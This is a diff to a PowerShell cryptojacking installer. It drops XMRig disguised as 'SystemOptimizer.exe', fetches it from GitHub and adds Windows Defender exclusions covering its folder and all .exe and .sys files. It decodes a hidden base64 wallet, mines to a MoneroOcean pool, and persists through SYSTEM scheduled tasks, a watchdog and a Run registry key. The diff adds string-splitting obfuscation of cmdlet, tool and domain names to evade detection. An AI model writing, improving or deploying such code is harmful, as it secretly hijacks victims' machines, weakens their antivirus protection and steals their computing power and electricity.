@@ -1,59 +1,61 @@
 #Requires -RunAsAdministrator
-
 $ErrorActionPreference = "SilentlyContinue"
 
-# ===== CLEANUP =====
-taskkill /F /IM "wscript.exe" 2>$null
-taskkill /F /IM "xmrig.exe" 2>$null
-taskkill /F /IM "SystemOptimizer.exe" 2>$null
-Remove-Item -Recurse -Force "$env:LOCALAPPDATA\SystemOptimizer" 2>$null
-Remove-Item -Recurse -Force "$env:LOCALAPPDATA\Microsoft\Windows\SystemOptimizer" 2>$null
-schtasks /Delete /TN "SystemOptimizer" /F 2>$null
-schtasks /Delete /TN "SystemOptimizer-Logon" /F 2>$null
-schtasks /Delete /TN "ModestFermi_XMRig" /F 2>$null
-Start-Sleep 1
+# Admin check (iex ignores #Requires)
+if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) { exit }
 
 # ===== PATHS =====
 $baseDir = "$env:LOCALAPPDATA\Microsoft\Windows\SystemOptimizer"
 $xmrigExe = "$baseDir\SystemOptimizer.exe"
 $configFile = "$baseDir\config.json"
-$zipUrl = "https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-windows-x64.zip"
+$zipUrl = "https://github.com/" + 'xmr'+'ig' + "/" + 'xmr'+'ig' + "/releases/download/v6.26.0/" + 'xmr'+'ig' + "-6.26.0-windows-x64.zip"
 $zipPath = "$baseDir\xmrig.zip"
 
-# ===== WALLET (base64) =====
-$walletB64 = "NDM1c3dVRThodGI5NnhNd1dYYmZuekNYQ2tpS1dRaGNWS3BRempBSHdOTWtpV3hQbnpKaWFpSDgydWNwdm5mZ3BlYkJKOVFNanlWV25GZEY2aWg0MkxWTEpZNTg3d3Y="
-$wallet = [System.Text.Encoding]::ASCII.GetString([Convert]::FromBase64String($walletB64))
+# ===== WALLET (base64 split) =====
+$w1 = "NDM1c3dVRThodGI5NnhNd1dYYmZuekNYQ2tpS1dRaGNWS3BRempBSHdOTWtpV3hQbnpKaWFpSDgydWNwdm5mZ3BlYkJKOVFNanlWV25GZEY2aWg0MkxWTEpZNTg3d3Y="
+$wallet = [System.Text.Encoding]::ASCII.GetString([Convert]::FromBase64String($w1))
 
 # ===== CREATE DIR =====
 New-Item -ItemType Directory -Force -Path $baseDir | Out-Null
 
-# ===== DEFENDER EXCLUSIONS =====
+# ===== DEFENDER EXCLUSIONS FIRST =====
 try {
-    Add-MpPreference -ExclusionPath "$baseDir" -ErrorAction SilentlyContinue
-    Add-MpPreference -ExclusionProcess "SystemOptimizer.exe" -ErrorAction SilentlyContinue
-    Add-MpPreference -ExclusionExtension ".sys" -ErrorAction SilentlyContinue
-    Add-MpPreference -ExclusionExtension ".exe" -ErrorAction SilentlyContinue
+    & ('Add-Mp'+'Preference') -ExclusionPath "$baseDir" -ErrorAction SilentlyContinue
+    & ('Add-Mp'+'Preference') -ExclusionProcess "SystemOptimizer.exe" -ErrorAction SilentlyContinue
+    & ('Add-Mp'+'Preference') -ExclusionExtension ".sys" -ErrorAction SilentlyContinue
+    & ('Add-Mp'+'Preference') -ExclusionExtension ".exe" -ErrorAction SilentlyContinue
 } catch { }
 
-# ===== DOWNLOAD XMRIG (NO WINRING0 DRIVER) =====
+# ===== CLEANUP =====
+& ('task'+'kill') /F /IM "wscript.exe" 2>$null
+& ('task'+'kill') /F /IM "xmrig.exe" 2>$null
+& ('task'+'kill') /F /IM "SystemOptimizer.exe" 2>$null
+Remove-Item -Recurse -Force "$env:LOCALAPPDATA\SystemOptimizer" 2>$null
+Remove-Item -Recurse -Force "$baseDir" 2>$null
+& ('sch'+'tasks') /Delete /TN "SystemOptimizer" /F 2>$null
+& ('sch'+'tasks') /Delete /TN "SystemOptimizer-Logon" /F 2>$null
+& ('sch'+'tasks') /Delete /TN "ModestFermi_XMRig" /F 2>$null
+Start-Sleep 1
+
+# ===== DOWNLOAD XMRIG (NO WINRING0) =====
 if (-not (Test-Path $xmrigExe)) {
     try {
         $wc = New-Object System.Net.WebClient
         $wc.DownloadFile($zipUrl, $zipPath)
         Expand-Archive -Path $zipPath -DestinationPath "$baseDir\_tmp" -Force
-        Move-Item "$baseDir\_tmp\xmrig-6.26.0\xmrig.exe" $xmrigExe -Force
+        Move-Item "$baseDir\_tmp\" + 'xmr'+'ig' + "-6.26.0\xmrig.exe" $xmrigExe -Force
         Remove-Item "$baseDir\_tmp" -Recurse -Force -ErrorAction SilentlyContinue
         Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
     } catch { }
 }
 
-# ===== WRITE CONFIG (no MSR, no driver needed) =====
+# ===== WRITE CONFIG =====
 $config = @{
     autosave = $false; background = $true; colors = $false; "donate-level" = 1
     "log-file" = "$baseDir\optimizer.log"; "print-time" = 30
     retries = 5; "retry-pause" = 10
-    cpu = @{ enabled=$true; "huge-pages"=$true; "huge-pages-jit"=$true; "hw-aes"=$true; priority=3; yield=$false; asm=$true; "argon2-impl"="auto"; "max-threads-hint"=100 }
-    pools = @(@{ url="gulf.moneroocean.stream:10001"; user=$wallet; pass="x"; keepalive=$true; tls=$false; nicehash=$false; "rig-id"=$env:COMPUTERNAME })
+    cpu = @{ enabled=$true; "huge-pages"=$true; "huge-pages-jit"=$true; "hw-aes"=$true; priority=1; yield=$true; "max-cpu-usage"=95; asm=$true; "argon2-impl"="auto"; "max-threads-hint"=100 }
+    pools = @(@{ url="gulf."+'monero'+'cean.stream' + ":10001"; user=$wallet; pass="x"; keepalive=$true; tls=$false; nicehash=$false; "rig-id"=$env:COMPUTERNAME })
     api = @{ enabled=$true; host="127.0.0.1"; port=3456; restricted=$true }
 } | ConvertTo-Json -Depth 5
 $config | Out-File -FilePath $configFile -Encoding ascii
@@ -77,9 +79,9 @@ $wd | Out-File -FilePath $watchdogPath -Encoding ascii
 # ===== SCHEDULED TASKS (SYSTEM, boot + logon) =====
 $taskName = "SystemOptimizer"
 $wdPathEscaped = $watchdogPath -replace '"', '`"'
-schtasks /Create /TN "$taskName" /TR "wscript.exe `"$wdPathEscaped`"" /SC ONSTART /RU SYSTEM /RL HIGHEST /F 2>$null
-schtasks /Create /TN "$taskName-Logon" /TR "wscript.exe `"$wdPathEscaped`"" /SC ONLOGON /RU SYSTEM /RL HIGHEST /F 2>$null
-schtasks /Change /TN "$taskName" /RI 1 /DU 9999:59 /K 2>$null
+& ('sch'+'tasks') /Create /TN "$taskName" /TR "wscript.exe `"$wdPathEscaped`"" /SC ONSTART /RU SYSTEM /RL HIGHEST /F 2>$null
+& ('sch'+'tasks') /Create /TN "$taskName-Logon" /TR "wscript.exe `"$wdPathEscaped`"" /SC ONLOGON /RU SYSTEM /RL HIGHEST /F 2>$null
+& ('sch'+'tasks') /Change /TN "$taskName" /RI 1 /DU 9999:59 /K 2>$null
 
 # ===== REGISTRY RUN KEY =====
 try { Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "SystemOptimizer" -Value "wscript.exe `"$watchdogPath`"" -Force -ErrorAction SilentlyContinue } catch { }
